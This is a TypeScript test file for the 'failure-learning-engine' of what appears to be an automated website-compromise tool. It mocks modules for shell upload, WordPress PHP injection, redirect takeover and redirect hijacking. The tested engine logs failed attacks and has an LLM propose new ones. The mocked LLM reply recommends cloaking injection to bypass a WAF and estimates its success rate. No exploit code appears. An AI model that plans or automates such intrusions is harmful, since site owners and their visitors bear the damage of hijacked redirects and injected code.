import { describe, it, expect, vi, beforeEach } from "vitest";

// Mock the database module
vi.mock("./db", () => ({
  db: {
    select: vi.fn().mockReturnValue({
      from: vi.fn().mockReturnValue({
        where: vi.fn().mockReturnValue({
          orderBy: vi.fn().mockReturnValue({
            limit: vi.fn().mockResolvedValue([]),
          }),
        }),
        orderBy: vi.fn().mockReturnValue({
          limit: vi.fn().mockResolvedValue([]),
        }),
      }),
    }),
    insert: vi.fn().mockReturnValue({
      values: vi.fn().mockResolvedValue([{ insertId: 1 }]),
    }),
    update: vi.fn().mockReturnValue({
      set: vi.fn().mockReturnValue({
        where: vi.fn().mockResolvedValue([]),
      }),
    }),
  },
}));

// Mock LLM
vi.mock("./_core/llm", () => ({
  invokeLLM: vi.fn().mockResolvedValue({
    choices: [
      {
        message: {
          content: JSON.stringify({
            patterns: [
              {
                pattern: "waf_blocked",
                description: "WAF blocks all upload attempts",
                affectedModes: ["full_chain", "pipeline"],
                suggestedCountermeasures: ["Use cloaking_inject to bypass WAF"],
              },
            ],
            newStrategies: [
              {
                strategy: "WAF bypass via cloaking",
                technique: "cloaking_inject with language-based routing",
                requiredMode: "cloaking_inject",
                estimatedSuccessRate: 45,
                reasoning: "WAF blocks direct uploads but cloaking may bypass",
                prerequisites: ["PHP execution available"],
              },
            ],
            overallInsight: "Domain is heavily protected by WAF",
          }),
        },
      },
    ],
  }),
}));

// Mock attack engines (dynamic imports)
vi.mock("./unified-attack-pipeline", () => ({
  runUnifiedAttackPipeline: vi.fn().mockResolvedValue({
    success: false,
    errors: ["WAF blocked"],
    verifiedFiles: [],
  }),
}));

vi.mock("./redirect-takeover", () => ({
  executeRedirectTakeover: vi.fn().mockResolvedValue([
    { success: false, method: "htaccess", detail: "403 Forbidden" },
  ]),
}));

vi.mock("./hijack-redirect-engine", () => ({
  executeHijackRedirect: vi.fn().mockResolvedValue({
    success: false,
    methodResults: [],
    winningMethod: null,
  }),
}));

vi.mock("./wp-php-injection-engine", () => ({
  executePhpInjectionAttack: vi.fn().mockResolvedValue({
    success: false,
    method: "none",
    errors: ["No writable path found"],
  }),
}));

// Mock agentic-attack-engine
vi.mock("./agentic-attack-engine", () => ({
  pickRedirectUrl: vi.fn().mockResolvedValue("https://example.com/redirect"),
}));

describe("failure-learning-engine", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe("FailureRecord type", () => {
    it("should accept valid failure record structure", async () => {
      const record: import("./failure-learning-engine").FailureRecord = {
        domain: "example.com",
        mode: "full_chain",
        serverType: "Apache",
        cms: "WordPress",
        waf: "Cloudflare",
        methodsTried: [
          { name: "Pipeline", status: "failed", reason: "WAF blocked" },
          { name: "Shell Upload", status: "timeout", reason: "Timeout 3min" },
        ],
        totalDurationMs: 120000,
      };
      expect(record.domain).toBe("example.com");
      expect(record.mode).toBe("full_chain");
      expect(record.methodsTried).toHaveLength(2);
    });

    it("should accept minimal failure record", async () => {
      const record: import("./failure-learning-engine").FailureRecord = {
        domain: "test.com",
        mode: "redirect_only",
        methodsTried: [{ name: "redirect", status: "failed", reason: "403" }],
        totalDurationMs: 5000,
      };
      expect(record.domain).toBe("test.com");
      expect(record.serverType).toBeUndefined();
    });
  });

  describe("saveFailureAnalytics", () => {
    it("should save failure analytics and return id or null", async () => {
      const { saveFailureAnalytics } = await import("./failure-learning-engine");
      
      const result = await saveFailureAnalytics({
        domain: "example.com",
        mode: "full_chain",
        methodsTried: [{ name: "Pipeline", status: "failed", reason: "WAF" }],
        totalDurationMs: 60000,
      });
      
      // Should return a number (insertId) or null on error
      expect(result === null || typeof result === "number").toBe(true);
    });
  });

  describe("suggestBestMode", () => {
    it("should return null when no failure history exists", async () => {
      const { suggestBestMode } = await import("./failure-learning-engine");
      const result = await suggestBestMode("brand-new-domain.com");
      // With no history in mock, should return null or a default suggestion
      expect(result === null || result?.recommendedMode).toBeTruthy();
    });

    it("should return a suggestion with required fields", async () => {
      const { suggestBestMode } = await import("./failure-learning-engine");
      // Mock some failure history
      const { db } = await import("./db");
      (db.select as any).mockReturnValueOnce({
        from: vi.fn().mockReturnValue({
          where: vi.fn().mockReturnValue({
            orderBy: vi.fn().mockReturnValue({
              limit: vi.fn().mockResolvedValue([
                {
                  id: 1,
                  domain: "similar.com",
                  mode: "full_chain",
                  failurePattern: "waf_blocked",
                  serverType: "nginx",
                  cms: "WordPress",
                  waf: "Cloudflare",
                  methodsTried: JSON.stringify([{ name: "Pipeline", status: "failed" }]),
                  strategiesGenerated: 2,
                  retryAttempted: true,
                  retrySuccess: false,
                },
              ]),
            }),
          }),
        }),
      });

      const result = await suggestBestMode("similar.com");
      if (result) {
        expect(result).toHaveProperty("recommendedMode");
        expect(result).toHaveProperty("confidence");
        expect(result).toHaveProperty("reasoning");
        expect(result).toHaveProperty("estimatedSuccessRate");
        expect(typeof result.confidence).toBe("number");
        expect(typeof result.recommendedMode).toBe("string");
      }
    });
  });

  describe("runFailureLearningLoop", () => {
    it("should analyze failure and generate strategies", async () => {
      const { runFailureLearningLoop } = await import("./failure-learning-engine");
      
      const result = await runFailureLearningLoop(
        {
          domain: "example.com",
          mode: "full_chain",
          serverType: "Apache",
          cms: "WordPress",
          waf: "Cloudflare",
          methodsTried: [
            { name: "Pipeline", status: "failed", reason: "WAF blocked all uploads" },
            { name: "Shell Upload", status: "timeout", reason: "Timeout 3min" },
          ],
          totalDurationMs: 180000,
        },
        "https://redirect.example.com",
        { enableAutoRetry: false },
      );

      expect(result).toHaveProperty("analyticsId");
      expect(result).toHaveProperty("strategies");
      expect(Array.isArray(result.strategies)).toBe(true);
    });

    it("should call onProgress callback when provided", async () => {
      const { runFailureLearningLoop } = await import("./failure-learning-engine");
      const progressMessages: string[] = [];
      
      await runFailureLearningLoop(
        {
          domain: "test.com",
          mode: "redirect_only",
          methodsTried: [{ name: "redirect", status: "failed", reason: "403" }],
          totalDurationMs: 5000,
        },
        "https://redirect.example.com",
        {
          enableAutoRetry: false,
          onProgress: async (msg) => {
            progressMessages.push(msg);
          },
        },
      );

      // Should have at least one progress message
      expect(progressMessages.length).toBeGreaterThanOrEqual(0);
    });

    it("should handle errors gracefully", async () => {
      const { runFailureLearningLoop } = await import("./failure-learning-engine");
      const { invokeLLM } = await import("./_core/llm");
      
      // Make LLM throw an error
      (invokeLLM as any).mockRejectedValueOnce(new Error("LLM unavailable"));
      
      const result = await runFailureLearningLoop(
        {
          domain: "error-test.com",
          mode: "full_chain",
          methodsTried: [{ name: "test", status: "failed", reason: "test" }],
          totalDurationMs: 1000,
        },
        "https://redirect.example.com",
        { enableAutoRetry: false },
      );

      // Should not throw, should return gracefully
      expect(result).toHaveProperty("analyticsId");
      expect(result).toHaveProperty("strategies");
    });
  });

  describe("getFailureLearningReport", () => {
    it("should return report data structure", async () => {
      const { getFailureLearningReport } = await import("./failure-learning-engine");
      
      const report = await getFailureLearningReport();
      
      expect(report).toHaveProperty("totalFailures");
      expect(report).toHaveProperty("totalRetries");
      expect(report).toHaveProperty("retrySuccessRate");
      expect(report).toHaveProperty("topFailurePatterns");
      expect(report).toHaveProperty("strategiesGenerated");
      expect(typeof report.totalFailures).toBe("number");
      expect(typeof report.retrySuccessRate).toBe("number");
      expect(Array.isArray(report.topFailurePatterns)).toBe(true);
    });
  });
});
